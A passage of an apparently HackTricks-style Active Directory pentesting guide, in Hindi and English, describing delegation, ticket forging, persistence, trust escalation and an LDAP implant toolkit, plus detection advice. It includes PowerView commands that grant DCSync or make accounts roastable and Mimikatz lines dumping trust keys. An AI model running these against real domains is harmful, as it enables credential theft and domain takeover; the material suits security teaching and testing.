यदि किसी user के पास **MSSQL instances** को **access** करने के privileges हैं, तो वह MSSQL host पर **commands execute** करने में सक्षम हो सकता है (यदि यह SA के रूप में चल रहा हो), **NetNTLM hash steal** कर सकता है या यहाँ तक कि **relay attack** भी कर सकता है।\
साथ ही, यदि एक MSSQL instance को किसी अन्य MSSQL instance द्वारा trusted (database link) माना जाता है। यदि user के पास उस trusted database पर privileges हैं, तो वह **trust relationship का उपयोग करके दूसरे instance में भी queries execute** कर पाएगा। इन trusts को chain किया जा सकता है और किसी बिंदु पर user को कोई misconfigured database मिल सकता है जहाँ वह commands execute कर सके।\
**Databases के बीच links forest trusts के across भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution के लिए शक्तिशाली paths expose करती हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आपको किसी Computer object में attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) के साथ मिलता है और आपके पास उस computer में domain privileges हैं, तो आप उस computer पर login करने वाले हर user की memory से TGTs dump कर सकेंगे।\
इसलिए, यदि कोई **Domain Admin computer पर login** करता है, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग करके उसकी impersonation कर सकेंगे।\
Constrained delegation की बदौलत आप यहाँ तक कि **automatically एक Print Server compromise** कर सकते हैं (उम्मीद है यह DC होगा)。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है, तो वह **किसी user की impersonation करके computer में कुछ services access** कर सकेगा।\
फिर, यदि आप इस user/computer का **hash compromise** कर लेते हैं, तो आप **किसी भी user** (यहाँ तक कि domain admins) की impersonation करके कुछ services access कर सकेंगे।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution प्राप्त किया जा सकता है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ **domain objects** पर कुछ **interesting privileges** हो सकते हैं, जो आपको laterally **move** करने/**escalate** privileges करने दे सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain के भीतर **Spool service listening** खोजने को **abuse** करके **new credentials acquire** किए जा सकते हैं और **privileges escalate** किए जा सकते हैं।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **other users** compromised machine को **access** करते हैं, तो **memory से credentials gather** करना और यहाँ तक कि उनकी processes में **beacons inject** करके उनकी impersonation करना संभव है।\
आमतौर पर users system को RDP के माध्यम से access करेंगे, इसलिए यहाँ आपके पास third party RDP sessions पर कुछ attacks perform करने का तरीका है:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined computers पर **local Administrator password** को manage करने के लिए एक system प्रदान करता है, यह सुनिश्चित करते हुए कि यह **randomized**, unique, और अक्सर **changed** हो। ये passwords Active Directory में stored होते हैं और access ACLs के माध्यम से केवल authorized users तक नियंत्रित रहता है। यदि इन passwords को access करने के लिए पर्याप्त permissions हों, तो अन्य computers पर pivoting संभव हो जाती है।


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised machine से **certificates gathering** environment के अंदर privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configured हैं, तो उन्हें abuse करके privileges escalate करना संभव है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार आपके पास **Domain Admin** या उससे भी बेहतर **Enterprise Admin** privileges आ जाएँ, तो आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**DCSync attack के बारे में अधिक जानकारी यहाँ मिल सकती है**](dcsync.md).

[**NTDS.dit steal करने के तरीके के बारे में अधिक जानकारी यहाँ मिल सकती है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

ऊपर चर्चा की गई कुछ techniques persistence के लिए उपयोग की जा सकती हैं।\
उदाहरण के लिए आप यह कर सकते हैं:

- Users को [**Kerberoast**](kerberoast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users को [**ASREPRoast**](asreproast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- किसी user को [**DCSync**](#dcsync) privileges देना

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** किसी specific service के लिए **NTLM hash** (उदाहरण के लिए, **PC account का hash**) का उपयोग करके एक **legitimate Ticket Granting Service (TGS) ticket** बनाता है। इस method का उपयोग **service privileges access** करने के लिए किया जाता है।


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker को Active Directory (AD) environment में **krbtgt account के NTLM hash** तक access मिल जाता है। यह account special है क्योंकि इसका उपयोग सभी **Ticket Granting Tickets (TGTs)** को sign करने के लिए किया जाता है, जो AD network के भीतर authenticate करने के लिए आवश्यक हैं।

एक बार attacker को यह hash मिल जाए, तो वह किसी भी account के लिए **TGTs** बना सकता है जिसे वह चुनता है (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets जैसे होते हैं, लेकिन इस तरह forged किए जाते हैं कि **common golden tickets detection mechanisms को bypass** कर दें।


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

किसी account के **certificates होना** या उन्हें **request** कर पाने में सक्षम होना, users account में persist रहने का एक बहुत अच्छा तरीका है (भले ही वह password बदल दे):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग domain के भीतर high privileges के साथ persist करने के लिए भी किया जा सकता है:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object **privileged groups** (जैसे Domain Admins और Enterprise Admins) की security सुनिश्चित करता है, इन groups पर एक standard **Access Control List (ACL)** लागू करके unauthorized changes को रोकता है। हालांकि, इस feature का दुरुपयोग किया जा सकता है; यदि attacker AdminSDHolder की ACL modify करके किसी regular user को full access दे दे, तो उस user को सभी privileged groups पर व्यापक control मिल जाता है। यह security measure, जो protection के लिए है, इस तरह उल्टा पड़ सकता है, जिससे अनचाहा access मिल सकता है जब तक closely monitored न किया जाए।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहाँ।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक **local administrator** account मौजूद होता है। ऐसी machine पर admin rights प्राप्त करके, local Administrator hash को **mimikatz** का उपयोग करके extract किया जा सकता है। इसके बाद, registry modification की आवश्यकता होती है ताकि इस password का **use enable** हो सके, जिससे local Administrator account तक remote access संभव हो जाता है।


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप कुछ specific domain objects पर किसी **user** को कुछ **special permissions** दे सकते हैं, जो user को भविष्य में **privileges escalate** करने देंगे।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** का उपयोग किसी **object** के over मौजूद **permissions** को **store** करने के लिए किया जाता है। यदि आप किसी object के **security descriptor** में बस थोड़ा-सा **change** कर सकें, तो आप उस object पर बिना किसी privileged group के member बने बहुत ही interesting privileges प्राप्त कर सकते हैं।


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class का abuse करके short-lived principals/GPOs/DNS records बनाए जाते हैं with `entryTTL`/`msDS-Entry-Time-To-Die`; वे tombstones के बिना self-delete हो जाते हैं, LDAP evidence मिटाते हुए orphan SIDs, broken `gPLink` references, या cached DNS responses छोड़ सकते हैं (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

**LSASS** को memory में alter करके एक **universal password** स्थापित करें, जिससे सभी domain accounts तक access मिल जाए।


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[जानें SSP (Security Support Provider) क्या है यहाँ।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपना **own SSP** बना सकते हैं ताकि machine access करने के लिए उपयोग किए गए credentials को **clear text** में **capture** किया जा सके।


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **new Domain Controller** register करता है और इसका उपयोग specified objects पर **attributes push** करने के लिए करता है (SIDHistory, SPNs...) **without** कोई **logs** छोड़े, जो **modifications** से संबंधित हों। आपको **DA** privileges चाहिए और **root domain** के अंदर होना चाहिए।\
ध्यान दें कि यदि आप गलत data का उपयोग करते हैं, तो बहुत ugly logs दिखाई देंगे।


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि यदि आपके पास **LAPS passwords read** करने के लिए पर्याप्त permission है, तो privileges कैसे escalate करें। हालांकि, इन passwords का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका अर्थ है कि **एक single domain compromise** करना संभवतः पूरे Forest के compromise तक ले जा सकता है।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक **domain** के user को दूसरे **domain** के resources access करने की अनुमति देता है। यह मूल रूप से दोनों domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications seamlessly flow कर सकें। जब domains trust set up करते हैं, तो वे अपने **Domain Controllers (DCs)** के भीतर specific **keys** exchange और retain करते हैं, जो trust की integrity के लिए crucial होती हैं।

एक typical scenario में, यदि कोई user किसी **trusted domain** में service access करना चाहता है, तो उसे पहले अपने domain के DC से एक special ticket, जिसे **inter-realm TGT** कहा जाता है, request करना होता है। यह TGT एक shared **key** से encrypted होता है जिस पर दोनों domains सहमत होते हैं। फिर user इस TGT को **trusted domain के DC** के सामने प्रस्तुत करता है ताकि एक service ticket (**TGS**) मिल सके। trusted domain के DC द्वारा inter-realm TGT के सफल validation पर, वह एक TGS जारी करता है, जिससे user को service access मिल जाता है।

**Steps**:

1. **Domain 1** में एक **client computer** अपने **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से एक **Ticket Granting Ticket (TGT)** request करके प्रक्रिया शुरू करता है।
2. यदि client successfully authenticated हो जाता है, तो DC1 एक नया TGT जारी करता है।
3. फिर client DC1 से एक **inter-realm TGT** request करता है, जो **Domain 2** के resources access करने के लिए आवश्यक है।
4. inter-realm TGT, two-way domain trust के हिस्से के रूप में DC1 और DC2 के बीच shared एक **trust key** से encrypted होता है।
5. client इस inter-realm TGT को **Domain 2's Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपने shared trust key का उपयोग करके inter-realm TGT verify करता है और, यदि valid हो, तो **Domain 2** के उस server के लिए एक **Ticket Granting Service (TGS)** जारी करता है जिसे client access करना चाहता है।
7. अंत में, client इस TGS को server के सामने प्रस्तुत करता है, जो server’s account hash से encrypted होता है, ताकि Domain 2 की service access मिल सके।

### Different trusts

ध्यान देना महत्वपूर्ण है कि **trust 1 way या 2 ways** हो सकता है। 2 ways विकल्प में, दोनों domains एक-दूसरे पर trust करेंगे, लेकिन **1 way** trust relation में domains में से एक **trusted** होगा और दूसरा **trusting** domain होगा। अंतिम case में, **आप केवल trusted one से trusting domain के अंदर resources access कर पाएँगे**।

यदि Domain A, Domain B पर trust करता है, तो A trusting domain है और B trusted one है। इसके अलावा, **Domain A** में यह **Outbound trust** होगा; और **Domain B** में यह **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह same forest के भीतर एक common setup है, जहाँ एक child domain अपने parent domain के साथ automatically two-way transitive trust रखता है। मूल रूप से, इसका अर्थ है कि authentication requests parent और child के बीच seamlessly flow कर सकती हैं।
- **Cross-link Trusts**: इन्हें "shortcut trusts" कहा जाता है, और ये referral processes को तेज़ करने के लिए child domains के बीच स्थापित किए जाते हैं। complex forests में, authentication referrals को आमतौर पर forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। cross-links बनाकर यह यात्रा छोटी हो जाती है, जो geographically dispersed environments में विशेष रूप से लाभदायक है।
- **External Trusts**: ये अलग, unrelated domains के बीच set up किए जाते हैं और स्वभाव से non-transitive होते हैं। [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts current forest के बाहर किसी ऐसे domain के resources access करने के लिए उपयोगी हैं जो forest trust से connected नहीं है। External trusts के साथ SID filtering के माध्यम से security बढ़ाई जाती है।
- **Tree-root Trusts**: ये trusts forest root domain और newly added tree root के बीच automatically established होते हैं। हालांकि आम तौर पर नहीं मिलते, tree-root trusts forest में नए domain trees जोड़ने के लिए महत्वपूर्ण हैं, जिससे वे unique domain name बनाए रख सकें और two-way transitivity सुनिश्चित हो। अधिक जानकारी [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: यह type of trust दो forest root domains के बीच एक two-way transitive trust है, और security measures को बढ़ाने के लिए SID filtering भी लागू करती है।
- **MIT Trusts**: ये trusts non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित होते हैं। MIT trusts कुछ अधिक specialized होते हैं और Windows ecosystem के बाहर Kerberos-based systems के integration की आवश्यकता वाले environments के लिए उपयुक्त होते हैं।

#### Other differences in **trusting relationships**

- Trust relationship transitive भी हो सकती है (A trust B, B trust C, then A trust C) या non-transitive।
- Trust relationship bidirectional trust (दोनों एक-दूसरे पर trust करते हैं) या one-way trust (केवल एक दूसरे पर trust करता है) के रूप में set up की जा सकती है।

### Attack Path

1. trusting relationships को **enumerate** करें
2. जाँचें कि क्या किसी **security principal** (user/group/computer) की **other domain** के resources तक **access** है, शायद ACE entries के माध्यम से या other domain के groups में होने से। **domains across relationships** देखें (trust शायद इसी कारण बनाया गया था)।
1. इस case में kerberoast एक और option हो सकता है।
3. उन **accounts** को **compromise** करें जो domains के through pivot कर सकते हैं।

Attacker के पास दूसरे domain में resources access करने के तीन primary mechanisms हो सकते हैं:

- **Local Group Membership**: Principals को machines पर local groups में जोड़ा जा सकता है, जैसे server पर “Administrators” group, जिससे उस machine पर significant control मिलता है।
- **Foreign Domain Group Membership**: Principals foreign domain के भीतर groups के member भी हो सकते हैं। हालांकि, इस method की effectiveness trust की nature और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को एक **ACL** में specify किया जा सकता है, विशेष रूप से **DACL** के भीतर **ACEs** के रूप में entities के तौर पर, जिससे उन्हें specific resources तक access मिलता है। ACLs, DACLs, और ACEs के mechanics में गहराई से जाने के इच्छुक लोगों के लिए “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” titled whitepaper एक invaluable resource है।

### Find external users/groups with permissions

आप domain में foreign security principals खोजने के लिए **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** check कर सकते हैं। ये **an external domain/forest** के user/group होंगे।

आप इसे **Bloodhound** में या powerview का उपयोग करके check कर सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
डोमेन trusts को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> You can the one used by the current domain them with:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Enterprise admin के रूप में child/parent domain तक escalate करें, trust को SID-History injection के जरिए abuse करके:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) को कैसे exploit किया जा सकता है, यह समझना crucial है। Configuration NC, Active Directory (AD) environments में पूरे forest के configuration data के लिए एक central repository के रूप में काम करता है। यह data forest के हर Domain Controller (DC) पर replicate होता है, और writable DCs Configuration NC की writable copy बनाए रखते हैं। इसका exploit करने के लिए, किसी के पास **SYSTEM privileges on a DC** होने चाहिए, preferably एक child DC।

**Link GPO to root DC site**

Configuration NC के Sites container में AD forest के भीतर सभी domain-joined computers के sites की जानकारी होती है। किसी भी DC पर SYSTEM privileges के साथ काम करके, attackers root DC sites से GPOs link कर सकते हैं। यह action इन sites पर लागू policies को manipulate करके root domain को potentially compromise कर सकता है।

ज़्यादा जानकारी के लिए, [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) पर research देखी जा सकती है।

**Compromise any gMSA in the forest**

एक attack vector में domain के भीतर privileged gMSAs को target करना शामिल है। KDS Root key, जो gMSAs' passwords calculate करने के लिए essential है, Configuration NC में stored होती है। किसी भी DC पर SYSTEM privileges के साथ, KDS Root key access करना और पूरे forest में किसी भी gMSA के passwords compute करना possible है।

विस्तृत analysis और step-by-step guidance यहां मिल सकती है:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – migration attributes का abuse):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

इस method में patience चाहिए, यानी नए privileged AD objects के creation का इंतज़ार करना। SYSTEM privileges के साथ, attacker AD Schema को modify करके किसी भी user को सभी classes पर complete control देने के लिए grant कर सकता है। इससे newly created AD objects पर unauthorized access और control मिल सकता है।

अधिक जानकारी के लिए [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) देखें।

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability Public Key Infrastructure (PKI) objects पर control target करती है, ताकि एक certificate template create किया जा सके जो forest के भीतर किसी भी user के रूप में authentication enable करता है। क्योंकि PKI objects Configuration NC में रहते हैं, इसलिए writable child DC compromise करने पर ESC5 attacks execute किए जा सकते हैं।

इस पर और details [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) में पढ़ी जा सकती हैं। जिन scenarios में ADCS नहीं होता, attacker के पास ज़रूरी components set up करने की capability होती है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में discussed है।

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस परिदृश्य में **आपका domain** एक external domain द्वारा trusted है, जो आपको उस पर **undetermined permissions** देता है। आपको यह पता लगाना होगा कि **आपके domain के किन principals के पास external domain पर कौन-सी access है** और फिर उसका exploit करने की कोशिश करनी होगी:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
इस scenario में **your domain** कुछ **privileges** **different domains** के principal को **trusting** कर रहा है।

हालांकि, जब **domain is trusted** trusting domain द्वारा, trusted domain **एक user create करता है** जिसका नाम **predictable** होता है और जो **password के रूप में trusted password** का उपयोग करता है। इसका मतलब है कि **trusting domain के एक user** को access करके **trusted one** के अंदर जा पाना संभव है, ताकि उसे enumerate किया जा सके और और अधिक privileges escalate करने की कोशिश की जा सके:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain को compromise करने का एक और तरीका है एक [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) ढूंढना जो domain trust की **opposite direction** में बनाया गया हो (जो बहुत common नहीं है)।

trusted domain को compromise करने का एक और तरीका है ऐसे machine पर wait करना जहाँ **trusted domain का एक user access कर सकता है** और **RDP** के जरिए login कर सकता है। फिर attacker RDP session process में code inject कर सकता है और वहां से victim के **origin domain** को access कर सकता है।\
इसके अलावा, अगर **victim ने अपनी hard drive mount की हो**, तो **RDP session** process से attacker hard drive के **startup folder** में **backdoors** store कर सकता है। इस technique को **RDPInception.** कहा जाता है


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trusts के across SID history attribute का उपयोग करके होने वाले attacks का risk SID Filtering द्वारा mitigate किया जाता है, जो सभी inter-forest trusts पर default रूप से activated होता है। यह इस assumption पर आधारित है कि intra-forest trusts secure होते हैं, और Microsoft के stance के अनुसार domain के बजाय forest को security boundary माना जाता है।
- हालांकि, एक catch है: SID filtering applications और user access को disrupt कर सकता है, जिससे इसे कभी-कभी deactivate कर दिया जाता है।

### **Selective Authentication:**

- inter-forest trusts के लिए, Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users automatically authenticated न हों। इसके बजाय, trusting domain या forest के अंदर domains और servers access करने के लिए users को explicit permissions की आवश्यकता होती है।
- यह ध्यान देना महत्वपूर्ण है कि ये measures writable Configuration Naming Context (NC) के exploitation या trust account पर attacks से सुरक्षा नहीं करते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[**LDAP BOF Collection**](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में re-implements करती है, जो पूरी तरह on-host implant (जैसे, Adaptix C2) के अंदर चलते हैं। Operators pack को `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` से compile करते हैं, `ldap.axs` load करते हैं, और फिर beacon से `ldap <subcommand>` call करते हैं। सारा traffic current logon security context के ऊपर LDAP (389) via signing/sealing या LDAPS (636) via auto certificate trust पर चलता है, इसलिए किसी socks proxies या disk artifacts की आवश्यकता नहीं होती।

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, और `get-groupmembers` short names/OU paths को full DNs में resolve करते हैं और संबंधित objects dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo` arbitrary attributes (security descriptors सहित) तथा `rootDSE` से forest/domain metadata लेते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd` roasting candidates, delegation settings, और existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को सीधे LDAP से expose करते हैं।
- `get-acl` और `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance को list करते हैं, जिससे ACL privilege escalation के लिए तुरंत targets मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Escalation और persistence के लिए LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operator को OU rights जहां मौजूद हों वहां नए principals या machine accounts stage करने देते हैं। `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे targets को hijack करते हैं जब write-property rights मिल जाते हैं।
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD object पर WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं, बिना PowerShell/ADSI artifacts छोड़े। `remove-*` counterparts injected ACEs को clean up करते हैं।

### Delegation, roasting, और Kerberos abuse

- `add-spn`/`set-spn` तुरंत एक compromised user को Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) password को छुए बिना उसे AS-REP roasting के लिए mark करता है।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को beacon से rewrite करते हैं, जिससे constrained/unconstrained/RBCD attack paths enable होते हैं और remote PowerShell या RSAT की जरूरत खत्म हो जाती है।

### sidHistory injection, OU relocation, और attack surface shaping

- `add-sidhistory` privileged SIDs को एक controlled principal की SID history में inject करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे पूरी तरह LDAP/LDAPS के जरिए stealthy access inheritance मिलती है।
- `move-object` computers या users का DN/OU बदलता है, जिससे attacker assets को उन OUs में drag कर सकता है जहां delegated rights पहले से मौजूद हों, और फिर `set-password`, `add-groupmember`, या `add-spn` abuse कर सकता है।
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) operator द्वारा credentials या persistence harvest करने के बाद rapid rollback की अनुमति देते हैं, जिससे telemetry कम होती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Credential Protection के लिए Defensive Measures**

- **Domain Admins Restrictions**: अनुशंसा की जाती है कि Domain Admins को केवल Domain Controllers पर login करने की अनुमति हो, और उनका उपयोग अन्य hosts पर न हो।
- **Service Account Privileges**: Security बनाए रखने के लिए services को Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **Temporal Privilege Limitation**: DA privileges की जरूरत वाले tasks के लिए उनकी duration सीमित होनी चाहिए। यह इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 audit करें और फिर DCs/clients पर LDAP signing plus LDAPS channel binding enforce करें ताकि LDAP MITM/relay attempts block हों।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity की Protocol-level fingerprinting

अगर आप common AD tradecraft detect करना चाहते हैं, तो **सिर्फ operator-controlled artifacts** जैसे renamed binaries, service names, temp batch files, या output paths पर भरोसा **न करें**। Legitimate Windows clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, और WMI traffic कैसे बनाते हैं, इसका baseline बनाएं, फिर **implementation quirks** देखें जो operator द्वारा `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, या `ntlmrelayx.py` edit करने के बाद भी बने रहते हैं।

- **High-confidence standalone candidates** (अपने baseline के खिलाफ validate करने के बाद):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- एक ही host/user/session/time window से इन traits में से कई, किसी एक weak field से कहीं अधिक मजबूत होते हैं
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, और tool-specific HTTP/WebDAV/RDP/MSSQL strings
